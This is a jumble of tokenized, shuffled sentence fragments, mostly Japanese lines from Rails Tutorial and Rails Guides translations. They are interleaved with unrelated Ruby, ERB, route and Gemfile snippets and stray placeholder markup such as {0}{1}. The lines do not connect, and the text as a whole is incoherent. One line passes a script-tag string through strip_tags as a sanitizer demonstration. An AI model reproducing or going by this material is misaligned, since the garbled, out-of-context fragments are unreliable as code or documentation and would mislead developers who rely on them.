▁ 配列 と 範囲 は いずれも 、\ emph { ブロック } を 伴 う さまざまな メソッド に対して 応答 することができます ▟ ブロック は 、 Ruby の 極めて 強力な 機能 であり 、 かつ わかりにくい 機能 で もあります 。
▁ここで 、 User モデルに \ k ode { admin } 属性 という もの があると しましょう ▟ この 属性 は 、 Web サイトの 管理者 である かどうか を示します
▁end
▁# ▁=> ▁We d , ▁ 23 ▁No v ▁2011
▁これにより 、 GitHub 上の ブランチ と プルリクエスト が 新しい コード によって 更新 されます 。
▁\ emph { 範囲 ▁( range )} ▁ は 、 配列 と 密 接 に 関係 しています ▟\ k ode { to \_ a } メソッドを使用して 配列 に変換 すると 理解 し やすい と思います 。
▁ シンプルな 実装 は以下のようになります 。
▁ パスワード は 空欄 で あって はならない ので 、 パスワード の存在 確 認 テストを 別 に追加します 。
▁resources ▁: cat eg or ies , ▁path : ▁' kategorien '
▁WARNING : ▁このメソッドは ` INNER ▁JOIN ` で しか 使用できません 。
▁self を省略した 結果を リスト \ ref { code : gitignore _ upload s } に示します 。
▁\ k ode { home } アクション 内で 、 フィード にも ページネーション を適用する
▁" ▁\ n ▁ foo \ n \ r ▁\ t ▁bar ▁\ n "▖ squish ▁# ▁=> ▁" foo ▁bar "
▁| field | ▁record ▖ send ( field ) ▁== ▁" E v i l " ▁ }
▁` config / environments / development ▖ rb ` に 以下の行 があります 。
▁m attr _ accessor ▁: ex p li c it ly _ un load able _ constant s
▁そこで 、 " Andy " という名前の クライアント を検索する か 、 その 名前 の クライアント が い ない場合は " Andy " という クライアント を作成して ロック を 外 す ことにします 。
▁ ╼\ end { code }╼╼ ▁\ subsection { 本番環境で の SSL } ▁% ▁( fold )╼ ▁\ label { sec : ssl _ in _ production }╼╼
▁: attributes オプション または : tags オプション が渡され ると 、 そこで 指定された タグ および 属性 のみ が 処理 の 対象 外 となります 。
▁(1▖▖10 ) ▁= == ▁( 3 ▖ ▖ 7 ) ▁# ▁=> ▁true
▁そこで 、 ログイン に 失敗した ときには 代わりに フラッシュメッセージ を表示する ことにします 。
▁ユーザー プロフィール と スタイル の ない マイクロポスト
▁最初の サインイン ビュー 。
▁### ▁` duplicable ?
▁リスト \ ref { code : signup _ with _ account _ activation _ test } のコードは 分 量 が多い よう に見えます が 、 本当に 重要な 部分 は 以下の 1 行 です 。
▁まずは ユーザーの 情報 が 互 い に 編集 できない ことを確認する ために 、 サンプルユーザー を もう 一 人 追加します 。
▁ エラーメッセージ が 必要であれば 、 バリデータ クラスの レコード の エラー コレクション に 手動で 追加 する必要があります 。
▁({0}{1} 第 8 章 {/1}{/0} で 本 格 的に 実装します ) 。
▁### ▁` head ` で ヘッダ のみ の レスポンス を生成する
▁この パターン は 以前 にも 出 現 した ことを 覚え ている でしょうか ▟ この 構造 は \ k ode { create } アクション の最初の バージョン ▁( リスト \ ref { code : first _ create _ action }) ▁ と 極めて 似 通 っています 。
▁ 通常の ファイルは ` re w in d ` に 応答 します 。
▁ これはリスト \ ref { code : rails _ default _ head } で使用されていました 。
▁ データベースに User オブジェクトを 保存 するためには 、\ k ode { user } オブジェクト から \ k ode { save } メソッドを呼び出す 必要があります 。
▁( 1 ▖ 9 の contact 機能 の 正 確 な 動作を 理解 している ことが 前 提 です ) 。
▁#### # ▁` beginning _ of _ year `、` end _ of _ year `
▁これ を利用して 、 エラーメッセージ を もっと 目 立 た せる ように css ルール を 定義 しても構いません 。
▁Rails によって Ruby の 組み込み クラス に 追加 が 行われている 例 については 、\ ref { sec : remember _ me } で説明します 。
▁# ▁Use ▁ unicorn ▁as ▁the ▁app ▁server
▁\ k ode { gem } ▁ コマンドで 特定の バージョン番号 を 指定 し ない限り 、 Bundler は自動的に 最新 バージョンの gem を取得し て インストール してくれます 。
▁\ k ode { edit } アクション の実装 から 始 め ますが 、 ここでは データベースから 適切な ユーザー データを 読み込む 必要があります 。
▁&& と and の動作 は 「 ほぼ 」 同等です が 、 & & 演算子 の方が and よりも \ href { http :// en ▖ w ikipedia ▖ org / wiki / Order _ of _ o p er ation s # Programming _ language s }{\ emph { 優 先 順 位 } } が 高い ので 、 & & だと \ k ode { root _ url } と の 論 理 的な 結 び 付き が 強く なり す ぎ てしまい 、 不 適切 です 。
▁ これはリスト \ ref { code : gemfile _ sqlite _ version } で使用されていました 。
▁ 統 計 情報 に スタイル を与える ために 、 リスト \ ref { code : stats _ css } のように SCSS を追加しましょう ▁( なお 、 この SCSS には この章 で使用する スタイル がすべて 含まれています ) 。
▁ 具体的には 、\ href { http ://0▖0▖0▖0:3000/ users }{/ users } の index ページを ブラウザで 開 く という 典型的な 操作 を行う ときに 何 が 起こ っている か を MVC ▁({1}{2} 図 2▖1 1 {/2}{/1} ) ▁ で説明します 。
▁def ▁log _ info ( sql , ▁name , ▁m s )
▁{0} 図 7 ▖2{/0} {1} 理想 と する 最終的な プロファイル ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / profile _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁以上で 、 Ruby 言語 の概要 の 説明 を 終わり ます 。
▁この 点を 踏 ま え て 考え ると 、 この場合 アプリケーション によって 作成 または 削除 される のは 、 つ ま る ところ 2 人のユーザー の 「\ emph { 関係 ▁( リレーションシップ ) }」 である ことがわかります 。
▁gem ▁' uglifier ', ▁' > = ▁1▖ 0 ▖ 3 '
▁f
▁第 \ ref { cha : updating _ showing _ and _ deleting _ users } 章では 、 どの ユーザー も 自分の アカウント 情報を 更新 できるように し 、 Web サイトの 管理者 が ユーザーを削除 できるようにします ▟ それ により 、 Users リソース に 表 \ ref { table : RESTful _ users } の REST アクション がすべて 実装 される ようにします 。
▁これ を確認する には 、 ユーザーの \ emph { count } を使用します ▟ 背 後で 動作する この \ k ode { count } メソッドは 、\ k ode { User } を含む あらゆる Active ▁Record クラス で 使用できます 。
▁def ▁validate _ each ( record , ▁attribute , ▁value )
▁最後に 、 開発 用 データベースに マイグレーション を 行い 、 テスト 用 データベース を 準備 します 。
▁config ▖ active _ record ▖ mass _ assignment _ sanitizer ▁= ▁: strict
▁#### ▁date _ field
▁self を省略した 結果を リスト \ ref { code : validates _ presence _ of _ name } に示します 。
▁ 順序 を 逆に したい場合は 、 一 段 階 低 い レベル の 技術 では あります が 、 次のように 生の SQL を 引数 に与える 必要があります 。
▁ ハッシュ では シンボル を キー として 使う ことが 一般的な ので 、 Ruby ▁1▖9 では このような 特殊な 場合 のための 新しい 記 法 をサポートしてい ます 。
▁* ▁` rake ▁ doc : rails ` を実行すると 、 Rails ▁API ドキュメント の 完全な コピー が アプリケーションの ` doc / api ` フォルダ に 生成されます 。
▁ RubyGems は Ruby の プロジェクト のための パッケージ マ ネ ー ジ ャ であり 、 Ruby の パッケージ ▁(\ emph { gem }) ▁ として 利用できる 多くの 有 用 な ライブラリ があります ▟ Rails も gem として インストール します 。
▁ 基本 となる タイトル を含む StaticPages コントローラの spec 。
▁$ ▁rails ▁console
▁ 幸 い 、 結合テスト は フラッシュメッセージ 残 留 などの 多くの 問題 解決 において 大 活 躍 します ▟ 期 待 される 動作 は 以下の テストで 正確に 表現 されています 。
▁### ▁ エンジン を設定する
▁create ▁test / fixtures / blorgh / articles ▖ yml
▁ Scaffold は 何 よりも 手 っ 取り 早い のが と り え だ が 、 これ を元に Rails を理解する には 向 い ていない 。
▁password
▁ 分割 された グループ を 内 包 する 配列 を 1 つ 返します 。
▁ パスワード 再設定 をテストする 手順 は 、 アカウント有効化 のテスト ▁( リスト \ ref { code : signup _ with _ account _ activation _ test }) ▁ と 多くの 共通 点 があります が 、 テスト の冒頭 部分 には 次のような 違い があります : ▁最初に 「 forgot ▁password 」 フォーム を表示し て 無効な メールアドレス を送信し 、 次は その フォーム で 有効なメールアドレス を送信し ます ▟ 後 者 では パスワード 再設定 用 トークン が作成され 、 再設定 用 メール が 送信されます 。
▁ sy s 	 0 m 0 ▖ 2 58 s
▁今度は 、 ユーザー情報 を変更 するために \ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ページ を表示し てみましょう ▁( {2} {3} 図 2▖ 7 {/3} {/2} ) 。
▁ そう い う ことが あって も 、 どう か 落 ち 込 ま ないでください ▟ オープンソース プロジェクト に 貢献 する うえで 肝 心 な のは 、 コ ミ ュ ニ テ ィ の 知 恵 を 遠 慮 なく 活用 させ てもらう ことです 。
▁たとえば 、 ユーザー登録フォーム で 新しい ユーザー を作成するとき は 、\ text tt { POST } リクエストを送信し ます 。
▁\ ref { sec : demo _ user _ has _ many _ microposts } では 、 {2} user _ id {/2} という 属性 を使用して 、1 人のユーザー に 複数の マイクロポスト が 関連付け られる という 構造 を 簡潔 に 説明します ▟ 詳細は \ k ode { {1} 第 11 章 {/1} } で 完全に 説明します 。
▁< td > Ruby ▁on ▁Rails ▁R o c k s !
▁$ ▁ rack up ▁-- help
▁### ▁ アセット の 編 成
▁It ▁work ed !
▁ 表 \ ref { table : valid _ email _ regex } から も 多くの ことを 学 べ ると は 思い ますが 、 正規表現 を 本当に 理解 するためには 実際に 使って 見 る のが 一番 です ▟ たとえば \ href { http :// www ▖ rubular ▖ com /}{ Rubular } という 対 話 的に 正規表現 を 試 せる Web サイト があります ▁( 図 \ ref { fig : rubular })
▁ 今回 \ k ode { before \_ create } コールバック を使用する 目的 は 、 トークン と それに対応する ダイジェスト を 割り当て る ためです ▟ 割り当て は以下のように 行う ことができます 。
▁* ▁` save ( validate : ▁false ) `
▁d ▁= ▁Date ▖ new (200 0, ▁2, ▁29 ) ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁リスト \ ref { code : generated _ application _ mailer } では メールの フォーマット に対応する メイラー レイアウト も 使用 されています ▟ なお 本チュートリアル の 説明 には 直接 関係 ありません が 、 生成される HTML メイラー の レイアウト や テキスト メイラー の レイアウト は \ k ode { app / views / layouts } で 確 認 できます 。
▁` collection ▖ build ` メソッドは 、 関連付け が 行われた オブジェクトを 1 つ または 複 数 返します 。
▁ { p 0} では HTML {2} フォーム {/2} を使用して 登録 情報を Web アプリケーションに 送信 します ▟ 続いて \ ref { sec : successful _ signup s } では ユーザーを 新規 作成 して 情報を データベースに保存 します 。
▁ サンプルアプリケーション を生成する ▁\ passing
▁その よい 例 は ` jquery - rails ` ▁gem です ▟ これは 標準 の JavaScript ライブラリ を gem として Rails に 提供し ます 。
▁今度は \ k ode { rake ▁test } の 結果は ▁\ passing ▁ になるはずです 。
▁< table >
▁ このコード を使用して マイクロポストの 合 計 数 を表示します 。
▁ そう した ト ラ ブ ル は む し ろ 技術 の 理解 を 深 め る 絶 好 の チ ャ ン ス と 捉 え 、 頑 張 って 解決 してみましょう 。
▁上の例では 、`: message ` オプション を使用して 属性の値 を含め る 方法を 示 しています 。
▁ 標準 の [ 配列 ](# 配列 で 表 された 条件 ) および [ 文字列 ](# 文字列 だけで 表 された 条件 ) 条件 を使用して 、 結合テーブル に 条件 を指定することができます 。
▁ 一括読み込み ▁( eager ▁loading ) ▁ とは 、` Model ▖ find ` によって 返される オブジェクト に 関連付けられた レコードを 読み込む ための メ カ ニ ズ ム であり 、 できる だけ クエリ の使用 回 数を 減 ら す ようにします 。
▁ クラウド IDE の場合 、 そう した 不要な 行 では ほとんどの場合 \ k ode { rvm } ▁( = Ruby ▁ Version ▁Manager ) ▁ という文字 が パス に含まれている ので 、 これ を利用して フィルタ します ▁( リスト \ ref { code : backtrace _ silencer }) 。
▁この テストでは 、\ k ode { reload } メソッドを使用して データベースから 値 を再度 読み込み 、\ k ode { assert \_ equal } メソッドを使用して 同 値 である かどうかを テスト してください 。
▁ 何 や ら コードが たくさん 書かれてい て 読み にくい ように 思 えます 。
▁ それぞれの 部分 が どう い う 意味 な のか を見てみましょう 。
▁ 「 doc rails の change log も 絶対に 変更 し ないこと 」
▁この ディレクティブ では 拡張子 を明示的に指定 する必要はありません 。
▁(\ text tt { - u } フラグ については 気にする必要はありません ▟ 気 になる のであれば ▁" git ▁set ▁ upstream " で 検索 してみてください ) 。
▁ パス に マッチする 動的 セグメント を再 利用 して リダイレクト することもできます 。
▁if ▁record ▖ first _ name ▁== ▁" E v i l "
▁\ emph { Rails チュートリアル } の この後 の 章では 、 Twitter のような マイクロポスト 機能 ▁( 第 \ ref { cha : user _ microposts } 章 ) ▁ と 、 フォロー 中の ユーザーの 投 稿 の ステータスフィード 機能 ▁( 第 \ ref { cha : following _ users } 章 ) ▁ の 基本的な 部分を サイトに 搭 載 する ことにしましょう 。
▁本章では 、 アプリケーションで メールの 送 受 信 を 行えるように するために必要な すべての 事 項 と 、 Action ▁Mailer の さまざまな 内部 情報 を提供します 。
▁ trashable ▁= ▁ trashable _ class ▖ constantize ▖ find ( trashable _ id )
▁ このテストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁ 以下のように 、 数値 を 電 話 番号 形式 の 文字列に変換 できます 。
▁#### ▁` assert _ generate s ` アサーション
▁ 自分の 環境で 動作する のであれば 、 それらの gem の 行 を コメント 解除 しても構いません ▟)
▁< script ▁src ="/ assets / t i cket s ▖ js ?
▁ いよいよ 、 ここ まで の 苦 労 の 成 果 を確認する 準備ができました ▁( 図 \ ref { fig : layout _ no _ logo _ or _ custom _ css }) 。
▁第 \ ref { cha : filling _ in _ the _ layout } 章 から 第 \ ref { cha : password _ reset } 章 に かけて 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 認証システムを 順に 作成し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁{0} 図 7 ▖ 19 {/0} {1} ユーザー登録 に 成功 した 画面 のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ success _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Ajax リクエストを 受 信 した 場合は 、 Rails が自動的に アクション と同じ 名前を持つ \ emph { JavaScript 組み込み Ruby } ▁(\ k ode { ▖ js ▖ erb }) ▁ ファイル ▁(\ k ode { create ▖ js ▖ erb } や \ k ode { destroy ▖ js ▖ erb } など ) ▁ を呼び出します 。
▁ 依存関係 を ` Gemfile ` に 指定した の では 伝 統 的な gem インストール で 依存関係 が 認 識 されない ので 、 必要な gem が自動的に インストール され ず 、 エンジン が 正常に 機能 し なくなります 。
▁ アセットパイプライン 導 入 後 は 、` app / assets ` ディレクトリ が アセット の 置き場所 として 推 奨 されています 。
▁これらの メソッドは 、 ビルトイン 版 の メソッドと 類似 しています 。
▁( 本チュートリアル で 初めて 紹 介 した テクニック ですが 、 この テクニック については 第 10 章で もう一度 取り上げ ます ▟ そこで は コールバック を定義する ときに {0} メソッド を参照 する {/0} という 慣習 について説明します ▟) {1} \ emph { }{/1}
▁Home ページ の内容 をテストする コード 。
▁ 私 は 、 Rails の 実際の 実装 とは 無 関係 に 、 コントローラ を 情報 の 流れ の 中 心 となる ハ ブ とみなす ことを 好 んで います 。
▁ strip _ tags (" some << b > script > alert (' hello ') << / b > / script > ")
▁Active ▁Support にも いくつかの 設定 オプション があります 。
▁invoke ▁ coffee
▁@ order ▁= ▁ Order ▖ create ( order _ date : ▁Time ▖ now , ▁customer _ id : ▁@ customer ▖ id )
▁これ は単なる 文字列 であり 、 好 き な 文字列 を使用できます ▟ RSpec はこの 文字列を 解 釈 し ないので 、 人 間 にとって わかりやす い 説明 を ここに 書く ようにします 。
▁1 つの コントローラ に対して 複数の ルーティング がある のは よく ある ことです ▟ そして コントローラ には いくつかの ▁ _ アクション _ ▁ があります ▟ いくつかの 異なる ルーティング に対して 、 それぞれ 異なる アクションを 割り当て ることができます 。
▁` collection ` を列挙し た 結果を option タグ 化 した 文字列 を返し 、 呼び出し の 結果を ` value _ method ` に オプション 値 として 割り当て 、` text _ method ` に オプション テキスト として 割り当て ます 。
▁gem をインストール すると 、 RubyGems によって ri と rdoc という 2 種類の ドキュメント が デフォルトで 作成されます ▟ 多くの Ruby や Rails の 開発者 は これらの ドキュメント が 自動生成 される 時間 すら 惜 しい と 考え ます
▁" hello "▖ to (0) ▁# ▁=> ▁" h "
▁Fin ally , ▁the ▁sample ▁app ▁will ▁use ▁all ▁aspect s ▁of ▁ MVC ; ▁we ’ ll ▁cover ▁controllers ▁and ▁views ▁starting ▁in ▁Section ▁\ ref { sec : static _ pages }, ▁models ▁starting ▁in ▁Section ▁\ ref { sec : user _ model }, ▁and ▁we ’ ll ▁see ▁all ▁three ▁working ▁together ▁in ▁Section ▁\ ref { sec : a _ users _ resource } ▖
▁╼╼ ▁\ subsection { Heroku にデプロイする ▁ (2) } ╼ ▁\ label { sec : heroku _ step _ two }╼╼ The re ▁is ▁no ▁step ▁two !
▁この ページ を作成し たら 、 {0}{1} 第 12 章 {/1}{/0} の サンプル ・ アプリケーション で使用する 予定です 。
▁リスト \ ref { code : test _ helper _ log _ in } で ログイン ヘルパーメソッド を定義し て お いた ので 、 このテストは 簡単に 書く ことができます ▟ 2 つの テストは それぞれ 以下の ようになります 。
▁| ▁--------- ▁| ▁------------ -------- ---------------- ▁| ▁- ---------------- ▁| ▁------------ --------------- --------------- ---------------- ---------------- ▁|
▁ 渡された コードを JavaScript 用 タグ に ラ ッ プ して 返します 。
▁ エンジンの 機能を 提供する
▁ 別の ユーザーの プロフィール を 編集 し ようとした ら リダイレクト させた い ので 、\ k ode { correct \_ user } という メソッド を作成し 、 before フィルター から この メソッドを呼び出す ようにします ▁( リスト \ ref { code : correct _ user _ before _ filter }) 。
▁### ▁Record T a g Helper
▁ユーザーの edit ビュー
▁=> ▁" 1 fd a 44 6 9 b c be c 3 bad f 5 4 18 2 6 9 f f c 59 6 8 "
▁その 際 、 データベースに サンプルデータを 追加 する方法 や 、 将来 ユーザー 数 が 膨 大 になって も index ページを 問題 なく 表示 できるように するための ユーザー 出力 の \ emph { ページ ネ ート ▁( paginate = ページ 分割 )} ▁ の 方法を 学びます 。
▁ 利 便 性 の ため 、 このとき インスタンス メソッド も 生成されます が 、 これらは 実際には クラス 属性 の 単 なる プロキシ です 。
▁* ▁` edit ▖ html ▖ erb `
▁# ▁ 時刻 選択 用 タグ を作成する ▟ フォーム が POST される と 、 submit ted 属性 の order 変数 が保存され る 。
▁このメソッドは 、` find ` と同様 の クエリ を使用して データベースに クエリ を送信し ますが 、 オブジェクトの コレクション の代わりに ` true ` または ` false ` を返します 。
▁` c attr _ reader `、` c attr _ writer `、` c attr _ accessor ` マクロ は 、` attr _ * ` と似ています が 、 クラス 用 である 点 が異なります 。
▁options _ for _ select ( [ ▁" V IS A ", ▁" M as ter C ar d " ▁ ])
▁around _ perform ▁do ▁| job , ▁block |
▁ 実 用 上 は 、 この 変更 によって ローカル での プリコンパイル が 行えるように なり 、 必要に応じて それらの ファイルを ワ ー キ ング ツリー に追加し て ソース 管理 に コミット できるようになります 。
▁use ▁Rack :: Conditional G e t
▁{0} 表 ▁5 ▖ 1 {/0} ▁{1} サイト リンク の ルート ▁( routing ) ▁ と URL の マッピング {/1}
▁この場合 、\ k ode { center } クラス に 属 している ▁(\ k ode { div } などの ) ▁ タグ の内側に ある 要素 は 、 すべて ページ 中 で セ ン タ リ ング される ことを 意味 しています
▁ユーザー インデックス 用の スタイル 。
▁このコードは 自動的に 、\ k ode { user ▖ followed _ users } を 「 フォローしているユーザー 」 の配列 を使用して 展開 します 。
▁Rails ドキュメント 内で コンポーネント を指す 場合には 常に 正 式 名 称 を使用すること ▟ ブログ 投 稿 や プ レ ゼ ン テ ー ション など でも この 点 に 留 意 し 、 異なる 名 称 で 読者 など を 驚 か せ ないようにする こと 。
▁ ユーザー編集ページ に対応する ビュー ▁ を 、 リスト \ ref { code : user _ edit _ view } に示します ▁( この ファイルは 手動で 作成 する必要があります ) 。
▁StaticPages コントローラ を生成する
▁def ▁# { severity ▖ downcase } ( message ▁= ▁nil , ▁ prog name ▁= ▁nil , ▁& block ) ▁# ▁def ▁debug ( message ▁= ▁nil , ▁ prog name ▁= ▁nil , ▁& block )
▁もちろん 、 ▖ gitignore など を 適切に 利用 すれば 、 そう した 機 密 情報を 適切に 扱 う ことができます ▟ しかし そのために は それ なり の 経験 が必要 であり 、 慣 れ た 開発者 でも ときに 扱 い を 間 違 え てしまう こと があり え る のです 。
▁ クライアント側 のコード では 衝 突 の 可能性 について 考 慮 せずに 独自 に `: log _ level ` を サブクラス で 定義 しています 。
▁* ▁` new _ geocoder _ path ` は ` / geocoder / new ` を返します
▁cookies を 設定 後 、 移動 先 の ページ で 以下のような コード を使用して ユーザーを 取り出す ことができます 。
▁ 他の ルート と同様 、\ k ode { get ▁ ’ / signup ’} と 記 述 した ことで \ k ode { signup _ path } という 名前付きルート が でき 、 それを リスト \ ref { code : home _ page _ signup _ link } で 使用します 。
▁def ▁new
▁ユーザー を新規作成する ページ ▁( ユーザー登録 )
▁class ▁Client ▁< ▁ActiveRecord :: Base
▁</ form >
▁has _ many ▁: orders , ▁ dependent : ▁: delete _ all , ▁validate : ▁: false
▁ 新しい セッション を作成する
▁Microposts コントローラの 骨 格
▁最後に 、\ k ode { module ▁Application Helper } という 要素 について解説します ▟ モジュール は 、 関連 した メソッドを まとめ る 方法 のひとつ で 、 Ruby の クラス で \ k ode { include } を使用すると 、 この モジュール を \ emph { ミックスイン ▁( m i x ed ▁in )} できます 。
▁ 何 が 追加される か 考えてみましょう ) 。
▁d ▖ prev _ year ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁ 19 99
▁` str ▖ first ( n ) ` という 呼び出し は 、` n ` ▁> ▁0 ▁ のとき ` str ▖ to ( n - 1 ) ` と 等 価 です ▟ ` n ` ▁== ▁0 の場合は 空 文字列 を返します 。
▁ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▁ }
▁しかし この 状 況 では \ k ode { current \_ user } を使う 方が 、 Rails によって \ k ode { user \_ path ( current \_ user )} され 、 ユーザー プロフィール へのリンク が自動的に 実現 できる ので ずっと 便利です 。
▁has _ and _ belongs _ to _ many ▁: f ri end s ,
▁\ k ode { new } アクション を生成する と 、 それに対応する \ emph { ビュー } も 生成されます ▟\ k ode { create } や \ k ode { destroy } には 対応する ビュー がない ▁( = 不要 ) ▁ なので 、 無駄な ビュー を作成し ない ために ここでは new だけ を指定して います 。
▁ 通常の テキストフィールド を作成します ▟ ユーザー名 や 検索 キーワード 入力 用の フィールド には この 通常の テキストフィールド を ご 使用 ください 。
▁* ▁ イニシャライザ
▁ここで \ k ode { show } という アクション の種類 は 、\ emph { 暗 黙 } の リクエスト になります ▟ Rails の REST 機能 が有効になってい ると 、\ text tt { GET } リクエスト は自動的に \ k ode { show } アクション として 扱 われます 。
▁ 原 則 に 従 えば 、 ここに はまだ 小さな セキュリティホール が 残 っています ▟ 管理者 が や ろ う と 思 えば 、\ text tt { DELETE } リクエストを コマンドラインで 直接 発行し て 自分自身 を 削除 できてしまいます 。
▁( 改良 すべき 点 として 、 有効化 されていない ユーザー が表示され ないようにする 必要 も ある のですが 、 これは \ ref { sec : exercises _ activation _ test _ and _ refactoring } の 課題 に 回 す ことにします ) 。
▁ 代りに 、 ハッシュ の配列 を返します ▟ 1 つの ハッシュ が 1 レコードを 表 します 。
▁| ▁| ▁42 9 ▁| ▁: to o _ many _ request s ▁|
▁ 残 っている 箇所 は 、 Microposts コントローラの 認可 をチェックする 短い テスト と 、 それら を まとめ る 統合テスト を書く ことです 。
▁* = ▁require ▁reset
▁ た った これ だけで 、 Rails は \ href { http :// cat b ▖ org / j argon / html / A / automagically ▖ html } { 自動的に } Ajax を使用します
▁config ▖ assets ▖ digest ▁= ▁true
▁create ▁app / views / users / new ▖ html ▖ erb
▁続いて 、 エンジンの ` Blorgh :: Article Controller # article _ params ` メソッドを 更新 して 、 新しい フォーム パラメータを 受け付け るように する 必要もあります 。
▁ Array ( foo : ▁: bar ) ▁# ▁=> ▁[ [: foo , ▁: bar ]]
▁> > ▁10 ▖ weeks ▖ ago
▁create ▁test / controllers / users _ controller _ test ▖ rb
▁Active ▁Record は 、 データベース 内の データ にアクセス するための リ ッ チ な API を提供します 。
▁さらに 申し上げ ると 、 この種の 永続的セッション を 手動で 確 認 するのは 非常に 面倒な ので 、\ k ode { current _ user } を リファクタリング する のであれば ▁( {1} 第 {2} 10 {/2} 章 {/1} で 行う 予定です ) ▁ 同時に テスト も 作成 しておくこと が重要です 。
▁Date ▖ new (201 2, ▁2, ▁29 )▖ years _ since (3) ▁# ▁=> ▁S at , ▁28 ▁Feb ▁20 15
▁また 、 シンボル を使用した 指定 部 も サポート されます 。
▁これにより 、 リモート クライアント は ▁( 訳 注 : ▁ 既存の キャッシュ を使用 せずに ) ▁ コンテンツ の 新しい コピー を サーバー に リクエスト します 。
▁本ガイドでは 、 アセットパイプライン ▁( asset ▁pipeline ) ▁ について解説します 。
▁たとえば 、1 つの データベース モデルに 全 従 業 員 を 格 納 しておきたい が 、 マ ネ ー ジ ャ ー と 部 下 ( s ub or d in ate ) の関係 も 追 え るように しておきたい 場合 が考えられます 。
▁ モデルオブジェクト の 初期化 時に 指定 し なかった フィールド にアクセス しようとすると 、 以下の メッセージ が表示されます 。
▁次の 図 \ ref { fig : filled _ in _ form } に示すように 、 テキストフィールド ▁(\ k ode { type =" text "} と \ k ode { type =" email " }) ▁ では 内容 をそのまま 表示 しています が 、 パスワード フィールド ▁(\ k ode { type =" password " }) ▁ では セキュリティ上の 目的 のために 文字 が 隠 蔽 されています ▁( 図 \ ref { fig : filled _ in _ form }) 。
▁この div タグ に 好 み の スタイル を与える ことができます 。
▁そこで 、 アカウントを有効化する 手順を 実装 して 、 ユーザーが 登録 に 使用 した メールアドレスを 本当に 所有 、 管理 している の かどうかを確認 する ようにしましょう 。
▁ユーザー から リクエスト された URL を Users リソース で使用する コントローラのアクション に 割り当て る ▁( マッピング する ) ▁ コードは 、 {0}{1} リスト 2▖2 {/1}{/0} のような 感じ になります ▟ このコード は Rails の ルーター 設定ファイル ▁( config / routes ▖ rb ) ▁ の 中 で使用され 、 URL と アクション の 組み合わせ ▁( {2}{1} 表 2▖1 {/1}{/2} ) ▁ を 効率 よく 設定 することができます
▁ここでは 、 リスト \ ref { code : user _ show _ view _ with _ gravatar } のように \ k ode { gravatar \_ for } ヘルパー メソッドを使用して Gravatar の 画像 を 利用 できるようにします 。
▁上の 手順 では \ k ode { remember } メソッドでは \ k ode { session [: user \_ id ]} が設定され ないので 、 問題 の 「 記 憶 」 ブランチ を これで テスト できるようになります 。
▁ テスト に すべて パス すれば 、 貢献 を 提 案 する 準備 が 整 います 。
▁まずは この HTML ソース の 内部 構造 について説明します 。
▁assemblies ▖ delete ( object , ▁ ▖▖▖)
▁\ href { http :// en ▖ gravatar ▖ com / site / implement / hash /}{ Gravatar の ホームページ } にも 書かれてい るように 、 Gravatar の URL は \ href { http :// en ▖ w ikipedia ▖ org / wiki / M D 5 } { M D 5 ハッシュ } を 用 いて ユーザーの メールアドレスを ハッシュ化 しています 。
▁=> ▁[" E mail ▁is ▁invalid ", ▁" Password ▁is ▁too ▁short ▁( minimum ▁is ▁6 ▁characters ) "]
▁Rails ▁4 には [ Turbolinks ▁gem ]( https :// github ▖ com / rails / turbolinks ) が 同 梱 されています 。
▁ フィード の 最終的な 実装
▁そこで 、 今回 も \ k ode { let !} を使います 。
▁Guard は自動的に Spork サーバーを起動 する ため 、 テスト 実行 時の オ ー バ ヘ ッ ド を 劇 的に 削 減 できます 。
▁ 本番環境で 動く サンプルアプリケーション
▁issue の レポート
▁date _ field _ tag ▁" d ob "
▁ 編集 の 失敗 に対するテスト
▁また 、 本書 は ▁Rails ▁ 関連の 本 の中で 唯 一 、 多くの プロ が 推 奨 する テスト駆動開発 ▁( TDD : ▁ Test ▁D r ive n ▁Development ) ▁ を 、 全 編 を通して 実 践 しています ▟ 実 例 を使って ここ まで 分 か り や す く 解説 された 本 は 、 本書 が 初めて でしょう 。
▁これ に よく 似 た 状 況 を \ ref { sec : uniqueness _ validation } でも 説明しました ▟ メールアドレス をデータベースに保存する 前に 、 メールアドレスを 全 部 小文字 に変換 する必要が あった の でした 。
▁ 変更 されていない ファイル や め った に 変更 されない ファイル がある場合 、 フィンガープリント も 変 化 し ないので 、 ファイル の内容 が 完全に 同 一 であること が 容易に 確 認 できます ▟ これは サーバー や デプロイ 日 が 異 な って いて も 有効 です 。
▁` head ` メソッドは ` render ▁: not h ing ` よりも 柔 軟 性 が 高 く 、 HTTP ヘッダー だけ を生成し ていること が 明 確 になる からです 。
▁これ に限ら ず 、 リファクタリング を行う 場合には 、 アプリケーションの コード を変更する 前 と 後で 必ず テスト を実行し 、 いずれも {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} になる ことを確認する ようにしてください 。
▁この 設定 を アプリケーション 内で 行なう には 、 イニシャライザ を使用する必要があります 。
▁ NGINX の場合 :
▁# ▁ SELECT ▁count (* ) ▁AS ▁count _ all ▁FROM ▁clients
▁</ div >
▁# ▁' include d ▁do ' は 、 インクルード された コードを
▁has _ many ▁: patients , ▁through : ▁: appointment s
▁* ▁[ Rack 公式 サイト ]( http :// rack ▖ github ▖ io )
▁end ▁# ▁end
▁ここでは 、 荒 れ 狂 う Web 世界 に オブジェクトを さ ら す こと の 危 険 性 を 改 めて 強 調 しています ▟ もし 、 任意の Web リクエスト の 初期化 ハッシュ を オブジェクト に 渡 せる となる と 、 攻撃者は 以下のような \ text tt { PATCH } リクエストを送信し て く る かもしれません
▁これ を解決する には 、 以下のように フォームの url を直接 指定します 。
▁` camelize ` メソッドは オプション の 引数 を 受け付け ます ▟ 使用できる のは `: up p er ` ▁( デフォルト ) ▁ または `: low er ` です 。
▁concern s ▁: comment able
▁このコードは リスト \ ref { code : micropost _ order _ test } で使用されていました ▟ もうひとつ 、
